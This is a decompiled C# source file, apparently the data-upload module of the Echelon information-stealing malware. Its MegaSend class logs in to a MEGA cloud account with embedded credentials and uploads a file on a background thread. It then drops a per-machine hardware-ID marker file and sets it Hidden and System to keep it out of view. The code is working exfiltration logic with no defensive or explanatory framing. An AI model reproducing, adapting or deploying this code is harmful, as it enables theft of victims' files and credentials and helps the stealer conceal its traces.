using System;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using CG.Web.MegaApiClient;

namespace Echelon.Global
{
	// Token: 0x02000044 RID: 68
	internal class MegaSend : Program
	{
		// Token: 0x06000192 RID: 402 RVA: 0x0000C5B0 File Offset: 0x0000A7B0
		public static void Send(string file)
		{
			MegaSend.client.Login(Program.megaLOGIN, Program.megaPass);
			MegaSend.TaskUpl(file);
			MegaSend.client.Logout();
			File.AppendAllText(Help.LocalData + "\\" + Help.HWID, Help.HWID + Help.dateLog);
			File.SetAttributes(Help.LocalData + "\\" + Help.HWID, FileAttributes.Hidden | FileAttributes.System);
		}

		// Token: 0x06000193 RID: 403 RVA: 0x0000C628 File Offset: 0x0000A828
		public static void TaskUpl(string file)
		{
			Task[] MT = new Task[]
			{
				new Task(delegate()
				{
					MegaSend.Upload(file);
				})
			};
			new Thread(delegate()
			{
				Task[] mt = MT;
				for (int i = 0; i < mt.Length; i++)
				{
					mt[i].Start();
				}
			}).Start();
			Task.WaitAll(MT);
		}

		// Token: 0x06000194 RID: 404 RVA: 0x0000C688 File Offset: 0x0000A888
		public static void Upload(string file)
		{
			INode parent = MegaSend.client.GetNodes().Single((INode x) => x.Type == NodeType.Root);
			INode node = MegaSend.client.UploadFile(file, parent, null);
			MegaSend.client.GetDownloadLink(node);
		}

		// Token: 0x0400008A RID: 138
		public static readonly MegaApiClient client = new MegaApiClient();
	}
}
